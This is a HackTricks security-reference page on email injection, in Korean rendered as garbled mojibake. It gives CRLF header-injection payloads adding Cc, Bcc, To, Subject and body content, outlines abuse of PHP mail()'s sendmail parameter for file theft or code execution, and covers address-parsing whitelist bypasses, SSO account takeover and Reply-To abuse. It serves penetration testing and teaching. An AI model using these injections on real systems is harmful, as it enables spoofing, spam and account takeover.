# Email Injections

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥ ì§„ë³´ëœ** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°**ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  **ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì ‘ê·¼í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## ì „ì†¡ëœ ì´ë©”ì¼ì— ì£¼ì…í•˜ê¸°

### ë°œì‹ ì ì¸ìˆ˜ ë’¤ì— Cc ë° Bcc ì£¼ì…í•˜ê¸°
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
ë©”ì‹œì§€ëŠ” ìˆ˜ì‹ ì ë° recipient1 ê³„ì •ìœ¼ë¡œ ì „ì†¡ë©ë‹ˆë‹¤.

### Inject argument
```
From:sender@domain.com%0ATo:attacker@domain.com
```
ë©”ì‹œì§€ëŠ” ì›ë˜ ìˆ˜ì‹ ìì™€ ê³µê²©ì ê³„ì •ìœ¼ë¡œ ì „ì†¡ë©ë‹ˆë‹¤.

### ì£¼ì œ ì¸ì ì£¼ì…
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
ê°€ì§œ ì œëª©ì€ ì›ë˜ ì œëª©ì— ì¶”ê°€ë˜ë©°, ê²½ìš°ì— ë”°ë¼ ì´ë¥¼ ëŒ€ì²´í•©ë‹ˆë‹¤. ì´ëŠ” ë©”ì¼ ì„œë¹„ìŠ¤ì˜ ë™ì‘ì— ë”°ë¼ ë‹¤ë¦…ë‹ˆë‹¤.

### ë©”ì‹œì§€ ë³¸ë¬¸ ë³€ê²½

ë‘ ê°œì˜ ì¤„ ë°”ê¿ˆì„ ì‚½ì…í•œ ë‹¤ìŒ, ë©”ì‹œì§€ ë³¸ë¬¸ì„ ë³€ê²½í•˜ê¸° ìœ„í•´ ë©”ì‹œì§€ë¥¼ ì‘ì„±í•©ë‹ˆë‹¤.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### PHP mail() í•¨ìˆ˜ ì•…ìš©
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### 5ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ ($additional\_parameters)

ì´ ì„¹ì…˜ì€ **ê³µê²©ìê°€ ì´ ë§¤ê°œë³€ìˆ˜ë¥¼ ì œì–´í•œë‹¤ê³  ê°€ì •í•  ë•Œ ì´ë¥¼ ì•…ìš©í•˜ëŠ” ë°©ë²•**ì— ê¸°ë°˜í•©ë‹ˆë‹¤.

ì´ ë§¤ê°œë³€ìˆ˜ëŠ” PHPê°€ ë°”ì´ë„ˆë¦¬ sendmailì„ í˜¸ì¶œí•˜ëŠ” ë° ì‚¬ìš©í•  ëª…ë ¹ì¤„ì— ì¶”ê°€ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ `escapeshellcmd($additional_parameters)` í•¨ìˆ˜ë¡œ ì„¸ì²™ë©ë‹ˆë‹¤.

ì´ ê²½ìš° ê³µê²©ìëŠ” **sendmailì— ëŒ€í•œ ì¶”ê°€ ë§¤ê°œë³€ìˆ˜ë¥¼ ì£¼ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

#### /usr/sbin/sendmail êµ¬í˜„ì˜ ì°¨ì´ì 

**sendmail** ì¸í„°í˜ì´ìŠ¤ëŠ” ì‹œìŠ¤í…œì— ì„¤ì¹˜ëœ **MTA ì´ë©”ì¼ ì†Œí”„íŠ¸ì›¨ì–´**(Sendmail, Postfix, Exim ë“±)ì— ì˜í•´ **ì œê³µë©ë‹ˆë‹¤**. ê¸°ë³¸ ê¸°ëŠ¥(-t -i -f ë§¤ê°œë³€ìˆ˜ ë“±)ì€ í˜¸í™˜ì„± ì´ìœ ë¡œ **ê°™ì§€ë§Œ**, ì„¤ì¹˜ëœ MTAì— ë”°ë¼ **ë‹¤ë¥¸ ê¸°ëŠ¥ê³¼ ë§¤ê°œë³€ìˆ˜**ëŠ” í¬ê²Œ ë‹¤ë¦…ë‹ˆë‹¤.

ë‹¤ìŒì€ sendmail ëª…ë ¹/ì¸í„°í˜ì´ìŠ¤ì˜ ë‹¤ì–‘í•œ ë§¤ë‰´ì–¼ í˜ì´ì§€ì˜ ëª‡ ê°€ì§€ ì˜ˆì…ë‹ˆë‹¤:

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

**sendmail** ë°”ì´ë„ˆë¦¬ì˜ ì¶œì²˜ì— ë”°ë¼ ì´ë¥¼ ì•…ìš©í•˜ê³  **íŒŒì¼ì„ ìœ ì¶œí•˜ê±°ë‚˜ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ”** ë‹¤ì–‘í•œ ì˜µì…˜ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

## ì´ë©”ì¼ ì´ë¦„ì— ì£¼ì…

### ì´ë©”ì¼ì˜ ë¬´ì‹œëœ ë¶€ë¶„

ê¸°í˜¸: **+, -** ë° **{}**ëŠ” ë“œë¬¼ê²Œ íƒœê·¸ ì§€ì •ì— ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë©° ëŒ€ë¶€ë¶„ì˜ ì´ë©”ì¼ ì„œë²„ì—ì„œ ë¬´ì‹œë©ë‹ˆë‹¤.

* ì˜ˆ: john.doe+intigriti@example.com â†’ john.doe@example.com

**ê´„í˜¸ () ì‚¬ì´ì˜ ì£¼ì„**ì€ ì‹œì‘ ë˜ëŠ” ëì—ì„œ ë¬´ì‹œë©ë‹ˆë‹¤.

* ì˜ˆ: john.doe(intigriti)@example.com â†’ john.doe@example.com

### í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ìš°íšŒ

<figure><img src="../.gitbook/assets/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### ì¸ìš©ë¶€í˜¸

<figure><img src="../.gitbook/assets/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IP

ëŒ€ê´„í˜¸ ì•ˆì— ë„ë©”ì¸ ì´ë¦„ìœ¼ë¡œ IPë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### ê¸°íƒ€ ì·¨ì•½ì 

![https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](<../.gitbook/assets/image (1131).png>)

## ì œ3ì SSO

### XSS

**github** ë˜ëŠ” **salesforce**ì™€ ê°™ì€ ì¼ë¶€ ì„œë¹„ìŠ¤ëŠ” **XSS í˜ì´ë¡œë“œê°€ í¬í•¨ëœ ì´ë©”ì¼ ì£¼ì†Œë¥¼ ìƒì„±í•  ìˆ˜ ìˆë„ë¡** í—ˆìš©í•©ë‹ˆë‹¤. ì´ ì œê³µìë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ì„œë¹„ìŠ¤ì— ë¡œê·¸ì¸í•  ìˆ˜ ìˆê³  ì´ ì„œë¹„ìŠ¤ê°€ ì´ë©”ì¼ì„ **ì˜¬ë°”ë¥´ê²Œ ì„¸ì²™í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´**, **XSS**ë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê³„ì • íƒˆì·¨

**SSO ì„œë¹„ìŠ¤**ê°€ **ì£¼ì–´ì§„ ì´ë©”ì¼ ì£¼ì†Œë¥¼ í™•ì¸í•˜ì§€ ì•Šê³  ê³„ì •ì„ ìƒì„±í•  ìˆ˜ ìˆë„ë¡** í—ˆìš©í•˜ê³ (ì˜ˆ: **salesforce**) ê·¸ ê³„ì •ì„ ì‚¬ìš©í•˜ì—¬ **salesforceë¥¼ ì‹ ë¢°í•˜ëŠ” ë‹¤ë¥¸ ì„œë¹„ìŠ¤ì— ë¡œê·¸ì¸í•  ìˆ˜ ìˆë‹¤ë©´**, ì–´ë–¤ ê³„ì •ì—ë„ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
_salesforceëŠ” ì£¼ì–´ì§„ ì´ë©”ì¼ì´ í™•ì¸ë˜ì—ˆëŠ”ì§€ ì—¬ë¶€ë¥¼ í‘œì‹œí•˜ì§€ë§Œ, ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ì´ ì •ë³´ë¥¼ ê³ ë ¤í•´ì•¼ í•©ë‹ˆë‹¤._

## íšŒì‹  ì£¼ì†Œ

_**From: company.com**_ì„ ì‚¬ìš©í•˜ì—¬ ì´ë©”ì¼ì„ ë³´ë‚´ê³  _**Replay-To: attacker.com**_ì„ ì„¤ì •í•˜ë©´, ë‚´ë¶€ ì£¼ì†Œì—ì„œ ì´ë©”ì¼ì´ ë°œì†¡ë˜ì—ˆê¸° ë•Œë¬¸ì— **ìë™ íšŒì‹ **ì´ ì „ì†¡ë  ê²½ìš° **ê³µê²©ì**ê°€ ê·¸ **ì‘ë‹µ**ì„ **ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

## í•˜ë“œ ë°”ìš´ìŠ¤ ë¹„ìœ¨

AWSì™€ ê°™ì€ íŠ¹ì • ì„œë¹„ìŠ¤ëŠ” **í•˜ë“œ ë°”ìš´ìŠ¤ ë¹„ìœ¨**ë¡œ ì•Œë ¤ì§„ ì„ê³„ê°’ì„ êµ¬í˜„í•˜ë©°, ì¼ë°˜ì ìœ¼ë¡œ 10%ë¡œ ì„¤ì •ë©ë‹ˆë‹¤. ì´ëŠ” ì´ë©”ì¼ ë°°ë‹¬ ì„œë¹„ìŠ¤ì— íŠ¹íˆ ì¤‘ìš”í•œ ì§€í‘œì…ë‹ˆë‹¤. ì´ ë¹„ìœ¨ì„ ì´ˆê³¼í•˜ë©´ AWSì˜ ì´ë©”ì¼ ì„œë¹„ìŠ¤ì™€ ê°™ì€ ì„œë¹„ìŠ¤ê°€ ì¤‘ë‹¨ë˜ê±°ë‚˜ ì°¨ë‹¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**í•˜ë“œ ë°”ìš´ìŠ¤**ëŠ” ìˆ˜ì‹ ìì˜ ì£¼ì†Œê°€ ìœ íš¨í•˜ì§€ ì•Šê±°ë‚˜ ì¡´ì¬í•˜ì§€ ì•Šì•„ ë°œì‹ ìì—ê²Œ ë°˜í™˜ëœ **ì´ë©”ì¼**ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ëŠ” **ì´ë©”ì¼**ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ì£¼ì†Œë¡œ ì „ì†¡ë˜ê±°ë‚˜, ì‹¤ì œê°€ ì•„ë‹Œ ë„ë©”ì¸ìœ¼ë¡œ ì „ì†¡ë˜ê±°ë‚˜, ìˆ˜ì‹ ì ì„œë²„ê°€ **ì´ë©”ì¼** ìˆ˜ì‹ ì„ ê±°ë¶€í•˜ëŠ” ë“±ì˜ ë‹¤ì–‘í•œ ì´ìœ ë¡œ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

AWSì˜ ë§¥ë½ì—ì„œ 1000ê°œì˜ ì´ë©”ì¼ì„ ë³´ë‚´ê³  ê·¸ ì¤‘ 100ê°œê°€ í•˜ë“œ ë°”ìš´ìŠ¤ê°€ ë°œìƒí•˜ë©´(ìœ íš¨í•˜ì§€ ì•Šì€ ì£¼ì†Œë‚˜ ë„ë©”ì¸ê³¼ ê°™ì€ ì´ìœ ë¡œ), ì´ëŠ” 10%ì˜ í•˜ë“œ ë°”ìš´ìŠ¤ ë¹„ìœ¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ ë¹„ìœ¨ì— ë„ë‹¬í•˜ê±°ë‚˜ ì´ˆê³¼í•˜ë©´ AWS SES(ê°„ë‹¨í•œ ì´ë©”ì¼ ì„œë¹„ìŠ¤)ê°€ ì´ë©”ì¼ ë°œì†¡ ê¸°ëŠ¥ì„ ì°¨ë‹¨í•˜ê±°ë‚˜ ì¤‘ë‹¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì¤‘ë‹¨ ì—†ëŠ” ì´ë©”ì¼ ì„œë¹„ìŠ¤ë¥¼ ë³´ì¥í•˜ê³  ë°œì‹ ì í‰íŒì„ ìœ ì§€í•˜ê¸° ìœ„í•´ ë‚®ì€ í•˜ë“œ ë°”ìš´ìŠ¤ ë¹„ìœ¨ì„ ìœ ì§€í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. ë©”ì¼ë§ ë¦¬ìŠ¤íŠ¸ì˜ ì´ë©”ì¼ ì£¼ì†Œ í’ˆì§ˆì„ ëª¨ë‹ˆí„°ë§í•˜ê³  ê´€ë¦¬í•˜ëŠ” ê²ƒì´ ì´ë¥¼ ë‹¬ì„±í•˜ëŠ” ë° í¬ê²Œ ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” AWSì˜ í•˜ë“œ ë°”ìš´ìŠ¤ ë° ë¶ˆë§Œ ì²˜ë¦¬ì— ëŒ€í•œ ê³µì‹ ë¬¸ì„œë¥¼ ì°¸ì¡°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## ì°¸ê³ ë¬¸í—Œ

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

{% hint style="success" %}
AWS í•´í‚¹ì„ ë°°ìš°ê³  ì—°ìŠµí•˜ì„¸ìš”:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ì„ ë°°ìš°ê³  ì—°ìŠµí•˜ì„¸ìš”: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ì°¸ì—¬í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥ ì§„ë³´ëœ** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ **ì›Œí¬í”Œë¡œìš°**ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  **ìë™í™”**í•˜ì„¸ìš”.\
ì§€ê¸ˆ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}
